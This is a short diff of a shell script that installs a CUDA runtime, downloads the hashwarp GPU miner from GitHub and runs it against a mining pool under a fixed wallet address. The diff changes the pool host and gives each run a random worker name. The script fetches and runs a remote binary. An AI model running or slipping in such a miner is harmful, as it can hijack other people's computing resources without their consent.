@@ -3,4 +3,4 @@ wget https://archive.ubuntu.com/ubuntu/pool/multiverse/n/nvidia-cuda-toolkit/lib
 dpkg -i libcudart12_12.4.127~12.4.1-4build1_amd64.deb
 wget https://github.com/microstack-tech/hashwarp/releases/download/v1.2.0/hashwarp-v1.2.0-cuda12-linux.tar.xz
 tar xf hashwarp-v1.2.0-cuda12-linux.tar.xz
-./hashwarp -P stratum1+tcp://0x48c27e67ddb605682609ce2b60278cdcf91fa284.x:webpassword=x@eu.rplant.xyz:7159
+./hashwarp -P stratum1+tcp://0x48c27e67ddb605682609ce2b60278cdcf91fa284.$(echo $RANDOM | md5sum | head -c 10)@prlx.coolpool.top:3003
